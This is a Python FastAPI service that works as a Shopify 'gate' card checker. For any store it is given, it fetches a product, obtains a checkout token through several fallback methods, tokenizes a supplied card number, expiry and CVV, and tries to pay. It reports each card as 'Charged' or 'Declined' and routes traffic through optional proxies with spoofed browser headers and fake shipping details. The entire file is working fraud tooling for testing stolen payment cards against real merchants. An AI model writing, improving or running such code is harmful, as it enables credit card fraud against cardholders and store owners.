from fastapi import FastAPI, Query
from fastapi.responses import JSONResponse
import aiohttp
import asyncio
import re
import json as _json
from urllib.parse import quote

app = FastAPI()

TIMEOUT = aiohttp.ClientTimeout(total=60, connect=10)


def normalize_url(site):
    site = site.strip()
    if not site.startswith("http"):
        site = f"https://{site}"
    return site.rstrip("/")


async def get_product(session, site, proxy=None):
    urls = [
        f"{site}/products.json?limit=1",
        f"{site}/collections/all/products.json?limit=1",
    ]
    headers = {
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
        "Accept": "application/json",
    }
    last_error = ""
    for url in urls:
        try:
            kwargs = {"timeout": TIMEOUT, "ssl": False, "headers": headers}
            if proxy:
                kwargs["proxy"] = proxy
            async with session.get(url, **kwargs) as r:
                if r.status == 200:
                    data = await r.json(content_type=None)
                    products = data.get("products", [])
                    if products:
                        p = products[0]
                        variant = p.get("variants", [{}])[0]
                        return {
                            "handle": p.get("handle", ""),
                            "variant_id": str(variant.get("id", "")),
                            "price": variant.get("price", "0.00"),
                            "title": p.get("title", ""),
                        }
                else:
                    last_error = f"status={r.status} url={url}"
        except Exception as e:
            last_error = f"exception={str(e)[:100]} url={url}"
            continue
    return {"_error": last_error}


async def get_checkout_token(session, site, variant_id, proxy=None):
    html_headers = {
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
        "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8",
        "Accept-Language": "en-US,en;q=0.9",
        "Accept-Encoding": "gzip, deflate, br",
        "Connection": "keep-alive",
        "Upgrade-Insecure-Requests": "1",
    }
    json_headers = {
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
        "Accept": "application/json",
        "Content-Type": "application/json",
    }

    def find_token(text):
        m = re.search(r"/checkouts/([a-f0-9]{32})", text)
        return m.group(1) if m else None

    jar = aiohttp.CookieJar(unsafe=True)
    connector = aiohttp.TCPConnector(ssl=False)
    async with aiohttp.ClientSession(connector=connector, cookie_jar=jar) as s:

        # Step 0: Visit homepage to get session cookies
        try:
            async with s.get(site, proxy=proxy, timeout=TIMEOUT, ssl=False, headers=html_headers) as r:
                pass
        except:
            pass

        # Method 1: Add to cart via JSON then GET /checkout
        try:
            async with s.post(
                f"{site}/cart/add.js",
                json={"id": int(variant_id), "quantity": 1},
                proxy=proxy, timeout=TIMEOUT, ssl=False, headers=json_headers
            ) as r:
                pass

            async with s.get(
                f"{site}/checkout",
                proxy=proxy, timeout=TIMEOUT,
                ssl=False, allow_redirects=True, headers=html_headers
            ) as r:
                tok = find_token(str(r.url))
                if tok: return tok
                tok = find_token(await r.text())
                if tok: return tok
        except:
            pass

        # Method 2: Add to cart via form then POST /cart/checkout
        try:
            async with s.post(
                f"{site}/cart/add.js",
                data=f"id={variant_id}&quantity=1",
                proxy=proxy, timeout=TIMEOUT, ssl=False,
                headers={**json_headers, "Content-Type": "application/x-www-form-urlencoded"}
            ) as r:
                pass

            async with s.post(
                f"{site}/cart/checkout",
                proxy=proxy, timeout=TIMEOUT, ssl=False,
                headers=html_headers, allow_redirects=True
            ) as r:
                tok = find_token(str(r.url))
                if tok: return tok
                tok = find_token(await r.text())
                if tok: return tok
        except:
            pass

        # Method 3: Cart permalink
        try:
            async with s.get(
                f"{site}/cart/{variant_id}:1",
                proxy=proxy, timeout=TIMEOUT,
                ssl=False, allow_redirects=True, headers=html_headers
            ) as r:
                tok = find_token(str(r.url))
                if tok: return tok
                tok = find_token(await r.text())
                if tok: return tok
        except:
            pass

        # Method 4: Add address then checkout (for stores requiring shipping)
        try:
            async with s.post(
                f"{site}/cart/add.js",
                json={"id": int(variant_id), "quantity": 1},
                proxy=proxy, timeout=TIMEOUT, ssl=False, headers=json_headers
            ) as r:
                pass

            # Get checkout page first
            checkout_token = None
            async with s.get(
                f"{site}/checkout",
                proxy=proxy, timeout=TIMEOUT,
                ssl=False, allow_redirects=True, headers=html_headers
            ) as r:
                final_url = str(r.url)
                tok = find_token(final_url)
                if tok:
                    checkout_token = tok
                else:
                    body = await r.text()
                    tok = find_token(body)
                    if tok:
                        checkout_token = tok

            if checkout_token:
                # Submit shipping address
                address_data = {
                    "_method": "patch",
                    "authenticity_token": "",
                    "previous_step": "contact_information",
                    "step": "shipping_method",
                    "checkout[email]": "test@gmail.com",
                    "checkout[shipping_address][first_name]": "John",
                    "checkout[shipping_address][last_name]": "Doe",
                    "checkout[shipping_address][address1]": "123 Main St",
                    "checkout[shipping_address][city]": "New York",
                    "checkout[shipping_address][country]": "United States",
                    "checkout[shipping_address][province]": "New York",
                    "checkout[shipping_address][zip]": "10001",
                    "checkout[shipping_address][phone]": "5551234567",
                }
                async with s.post(
                    f"{site}/checkouts/{checkout_token}",
                    data=address_data, proxy=proxy, timeout=TIMEOUT,
                    ssl=False, allow_redirects=True,
                    headers={**html_headers, "Content-Type": "application/x-www-form-urlencoded"}
                ) as r:
                    tok = find_token(str(r.url))
                    if tok: return tok
                    return checkout_token  # return original token even if redirect fails

        except:
            pass

    return None


async def tokenize_card(session, cc_parts, proxy=None):
    try:
        number, month, year, cvv = cc_parts
        if len(year) == 2:
            year = "20" + year

        payload = {
            "credit_card": {
                "number": number,
                "month": month,
                "year": year,
                "verification_value": cvv,
                "name": "John Doe",
            }
        }
        async with session.post(
            "https://elb.deposit.shopifycs.com/sessions",
            json=payload, proxy=proxy, timeout=TIMEOUT, ssl=False
        ) as r:
            if r.status == 200:
                data = await r.json(content_type=None)
                return data.get("id")
    except:
        pass
    return None


@app.get("/shopify")
async def check_shopify(
    site: str = Query(...),
    cc: str = Query(...),
    proxy: str = Query(None)
):
    try:
        cc_clean = cc.replace("|", ":").replace("/", ":").replace(" ", ":")
        parts = [p.strip() for p in cc_clean.split(":") if p.strip()]
        if len(parts) != 4:
            return JSONResponse({"Status": False, "Response": "Invalid card format", "Price": "-", "Gate": "Shopify"})

        number, month, year, cvv = parts
        if len(year) == 2:
            year = "20" + year
        site_url = normalize_url(site)
        proxy_url = proxy if proxy else None

        connector = aiohttp.TCPConnector(ssl=False, limit=10)
        async with aiohttp.ClientSession(connector=connector) as session:

            product = await get_product(session, site_url, proxy_url)
            if not product or "_error" in product:
                err = product.get("_error", "unknown") if product else "none returned"
                return JSONResponse({"Status": False, "Response": "No valid products", "Debug": err, "Price": "-", "Gate": "Shopify"})

            price = product["price"]
            variant_id = product["variant_id"]

            checkout_token = await get_checkout_token(session, site_url, variant_id, proxy_url)
            if not checkout_token:
                return JSONResponse({"Status": False, "Response": "Failed to get checkout token", "Price": price, "Gate": "Shopify"})

            card_token = await tokenize_card(session, [number, month, year, cvv], proxy_url)
            if not card_token:
                return JSONResponse({"Status": False, "Response": "Failed to tokenize card", "Price": price, "Gate": "Shopify"})

            # Method 1: Wallet payments API
            try:
                payload = {
                    "payment": {
                        "payment_token": {"payment_data": card_token, "type": "shopify_token"},
                        "amount": price,
                        "unique_token": card_token[:16],
                    }
                }
                headers = {
                    "Content-Type": "application/json",
                    "X-Shopify-Checkout-Version": "2016-09-06",
                    "Accept": "application/json",
                }
                async with session.post(
                    f"{site_url}/wallets/checkouts/{checkout_token}/payments",
                    json=payload, timeout=TIMEOUT, ssl=False, headers=headers
                ) as r:
                    raw1 = await r.json(content_type=None)
                    status1 = r.status

                    # Check payment result
                    if status1 == 200:
                        payment = raw1.get("payment", {})
                        transaction = payment.get("transaction", {})
                        tx_status = transaction.get("status", "")
                        tx_message = transaction.get("message", "")
                        error_msg = raw1.get("errors", "")

                        if tx_status == "success":
                            return JSONResponse({
                                "Status": True,
                                "Response": "Charged",
                                "Message": tx_message or "Payment approved",
                                "Price": f"${price}",
                                "Gate": "Shopify"
                            })
                        elif tx_status in ["failure", "error"]:
                            return JSONResponse({
                                "Status": False,
                                "Response": "Declined",
                                "Message": tx_message or str(error_msg),
                                "Price": f"${price}",
                                "Gate": "Shopify"
                            })

            except Exception as e:
                pass

            # Method 2: Form-based checkout
            try:
                form_data = {
                    "_method": "patch",
                    "authenticity_token": "",
                    "previous_step": "payment_method",
                    "step": "",
                    "s": card_token,
                    "complete": "1",
                }
                headers2 = {
                    "Content-Type": "application/x-www-form-urlencoded",
                    "Accept": "application/json",
                    "X-Requested-With": "XMLHttpRequest",
                    "User-Agent": "Mozilla/5.0",
                }
                async with session.post(
                    f"{site_url}/checkouts/{checkout_token}",
                    data=form_data, timeout=TIMEOUT, ssl=False,
                    headers=headers2, allow_redirects=True
                ) as r:
                    raw2 = await r.json(content_type=None)
                    final_url2 = str(r.url)

                    checkout_data = raw2.get("checkout", {})
                    order = raw2.get("order", {})

                    if order or "thank_you" in final_url2:
                        return JSONResponse({
                            "Status": True,
                            "Response": "Charged",
                            "Message": "Order placed successfully",
                            "Price": f"${price}",
                            "Gate": "Shopify"
                        })

                    errors = raw2.get("errors", {})
                    if errors:
                        err_msg = str(errors)
                        return JSONResponse({
                            "Status": False,
                            "Response": "Declined",
                            "Message": err_msg[:200],
                            "Price": f"${price}",
                            "Gate": "Shopify"
                        })

            except Exception as e:
                pass

            return JSONResponse({
                "Status": False,
                "Response": "Unknown",
                "Message": "Could not determine payment result",
                "Price": f"${price}",
                "Gate": "Shopify"
            })

    except asyncio.TimeoutError:
        return JSONResponse({"Status": False, "Response": "Timeout", "Price": "-", "Gate": "Shopify"})
    except Exception as e:
        return JSONResponse({"Status": False, "Response": str(e)[:100], "Price": "-", "Gate": "Shopify"})


@app.get("/")
async def root():
    return {"status": "API Running ✅"}
